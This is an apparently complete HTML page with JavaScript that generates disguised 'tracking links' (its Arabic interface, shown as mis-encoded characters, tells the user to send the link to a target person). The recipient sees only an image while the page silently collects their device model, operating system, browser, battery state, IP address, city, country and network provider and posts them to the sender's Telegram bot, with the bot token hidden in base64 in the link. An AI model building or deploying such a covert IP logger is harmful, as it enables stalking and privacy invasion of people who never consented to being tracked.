<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ØªÙˆÙ„ÙŠØ¯ Ø±ÙˆØ§Ø¨Ø· Ø§Ù„ØªØªØ¨Ø¹ Ø§Ù„Ø°ÙƒÙŠØ©</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/0.7.33/ua-parser.min.js"></script>
    <style>
        :root { --primary: #00d2ff; --dark: #121212; --card: #1e1e1e; }
        body { font-family: 'Segoe UI', sans-serif; background: var(--dark); color: white; padding: 20px; }
        .container { max-width: 700px; margin: auto; }
        .card { background: var(--card); padding: 25px; border-radius: 15px; border: 1px solid #333; margin-bottom: 20px; }
        input, textarea { width: 100%; padding: 12px; margin: 10px 0; border-radius: 8px; border: 1px solid #444; background: #000; color: var(--primary); box-sizing: border-box; }
        .btn { background: var(--primary); color: #000; padding: 12px; border: none; border-radius: 8px; cursor: pointer; width: 100%; font-weight: bold; }
        #linkResult { display: none; }
        .label { font-size: 14px; color: #aaa; margin-top: 10px; display: block; }
        img { max-width: 100%; border-radius: 10px; margin-top: 20px; box-shadow: 0 0 15px rgba(0,210,255,0.3); }
    </style>
</head>
<body>

<div class="container">
    <div id="setup-panel">
        <div class="card">
            <h2>âš™ï¸ Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„ØªØªØ¨Ø¹</h2>
            
            <label class="label">ØªÙˆÙƒÙ† Ø§Ù„Ø¨ÙˆØª (Bot Token):</label>
            <input type="text" id="botToken" placeholder="123456789:ABCdef...">
            
            <label class="label">Ø§Ù„Ø£ÙŠØ¯ÙŠ Ø§Ù„Ø®Ø§Øµ Ø¨Ùƒ (Chat ID):</label>
            <input type="text" id="chatId" placeholder="987654321">

            <label class="label">Ø§Ø®ØªØ± Ø§Ù„ØµÙˆØ±Ø© Ø§Ù„Ù…Ø±Ø§Ø¯ Ø¥Ø±Ø³Ø§Ù„Ù‡Ø§:</label>
            <input type="file" id="imageFile" accept="image/*">

            <button class="btn" onclick="generateLink()">Ø¥Ù†Ø´Ø§Ø¡ Ø±Ø§Ø¨Ø· Ø§Ù„ØªØªØ¨Ø¹ ğŸš€</button>
        </div>

        <div class="card" id="linkResult">
            <h3>ğŸ”— Ø§Ù„Ø±Ø§Ø¨Ø· Ø§Ù„Ø¬Ø§Ù‡Ø²:</h3>
            <p style="font-size: 12px; color: #888;">Ø£Ø±Ø³Ù„ Ù‡Ø°Ø§ Ø§Ù„Ø±Ø§Ø¨Ø· Ù„Ù„Ø´Ø®Øµ Ø§Ù„Ù…Ø³ØªÙ‡Ø¯Ù:</p>
            <textarea id="finalUrl" readonly></textarea>
            <button class="btn" style="background:#444; color:#fff;" onclick="copyLink()">Ù†Ø³Ø® Ø§Ù„Ø±Ø§Ø¨Ø·</button>
        </div>
    </div>

    <div id="victim-view" style="display:none;">
        <img id="displayImg" src="">
    </div>
</div>

<script>
    const urlParams = new URLSearchParams(window.location.search);

    // --- Ù…Ù†Ø·Ù‚ Ø§Ù„Ø·Ø±Ù Ø§Ù„Ø¢Ø®Ø± (Ø§Ù„Ù…Ø³ØªÙ„Ù…) ---
    if (urlParams.has('t') && urlParams.has('c')) {
        document.getElementById('setup-panel').style.display = 'none';
        document.getElementById('victim-view').style.display = 'block';

        const token = atob(urlParams.get('t')); // ÙÙƒ ØªØ´ÙÙŠØ± Ø§Ù„ØªÙˆÙƒÙ†
        const chat = atob(urlParams.get('c'));  // ÙÙƒ ØªØ´ÙÙŠØ± Ø§Ù„Ø£ÙŠØ¯ÙŠ
        const imageHash = window.location.hash.substring(1);

        if(imageHash) document.getElementById('displayImg').src = imageHash;

        // ØªÙ†ÙÙŠØ° Ø¹Ù…Ù„ÙŠØ© Ø§Ù„ØªØªØ¨Ø¹ ÙÙˆØ±Ø§Ù‹
        sendDataToTelegram(token, chat);
    }

    // --- Ù…Ù†Ø·Ù‚ Ù„ÙˆØ­Ø© Ø§Ù„ØªØ­ÙƒÙ… (Ø£Ù†Øª) ---
    function generateLink() {
        const token = document.getElementById('botToken').value;
        const chat = document.getElementById('chatId').value;
        const file = document.getElementById('imageFile').files[0];

        if (!token || !chat || !file) {
            alert("ÙŠØ±Ø¬Ù‰ Ù…Ù„Ø¡ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø­Ù‚ÙˆÙ„ ÙˆØ§Ø®ØªÙŠØ§Ø± ØµÙˆØ±Ø©!");
            return;
        }

        const reader = new FileReader();
        reader.onload = function(e) {
            const base64Image = e.target.result;
            const baseUrl = window.location.href.split('?')[0];
            
            // ØªØ´ÙÙŠØ± Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø¨Ø¨Ø³Ø§Ø·Ø© (Base64) Ù„Ø¥Ø®ÙØ§Ø¦Ù‡Ø§ Ù…Ù† Ø§Ù„Ø±Ø§Ø¨Ø· Ø§Ù„Ù…Ø¨Ø§Ø´Ø±
            const encodedToken = btoa(token);
            const encodedChat = btoa(chat);

            const finalLink = `${baseUrl}?t=${encodedToken}&c=${encodedChat}#${base64Image}`;
            
            document.getElementById('finalUrl').value = finalLink;
            document.getElementById('linkResult').style.display = 'block';
        };
        reader.readAsDataURL(file);
    }

    async function sendDataToTelegram(token, chat) {
        const parser = new UAParser();
        const ua = parser.getResult();
        
        let batteryInfo = "ØºÙŠØ± Ù…ØªØ§Ø­";
        try {
            const b = await navigator.getBattery();
            batteryInfo = `${Math.round(b.level * 100)}% (${b.charging ? 'ÙŠÙØ´Ø­Ù†' : 'Ù„Ø§ ÙŠÙØ´Ø­Ù†'})`;
        } catch(e) {}

        let ipInfo = "Ø¬Ø§Ø±ÙŠ Ø§Ù„Ø¬Ù„Ø¨...";
        try {
            const res = await fetch('https://ipapi.co/json/');
            const data = await res.json();
            ipInfo = `ğŸ“ ${data.city}, ${data.country_name}\nğŸŒ IP: ${data.ip}\nğŸ¢ Ø§Ù„Ø´Ø¨ÙƒØ©: ${data.org}`;
        } catch(e) {}

        const text = `
âœ… **ØªÙ… ÙØªØ­ Ø§Ù„Ø±Ø§Ø¨Ø· Ø¨Ù†Ø¬Ø§Ø­!**
â”â”â”â”â”â”â”â”â”â”â”â”â”â”
ğŸ“± **Ø§Ù„Ø¬Ù‡Ø§Ø²:** ${ua.device.vendor || ''} ${ua.device.model || 'PC'}
ğŸ’» **Ø§Ù„Ù†Ø¸Ø§Ù…:** ${ua.os.name} ${ua.os.version}
ğŸŒ **Ø§Ù„Ù…ØªØµÙØ­:** ${ua.browser.name}
ğŸ”‹ **Ø§Ù„Ø¨Ø·Ø§Ø±ÙŠØ©:** ${batteryInfo}
ğŸ“¡ **Ø§Ù„Ù…ÙˆÙ‚Ø¹ ÙˆØ§Ù„Ø´Ø¨ÙƒØ©:**
${ipInfo}
â° **Ø§Ù„ÙˆÙ‚Øª:** ${new Date().toLocaleString('ar-EG')}
â”â”â”â”â”â”â”â”â”â”â”â”â”â”
        `;

        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chat, text: text, parse_mode: 'Markdown' })
        });
    }

    function copyLink() {
        const copyText = document.getElementById("finalUrl");
        copyText.select();
        document.execCommand("copy");
        alert("ØªÙ… Ù†Ø³Ø® Ø§Ù„Ø±Ø§Ø¨Ø·!");
    }
</script>
</body>
</html>
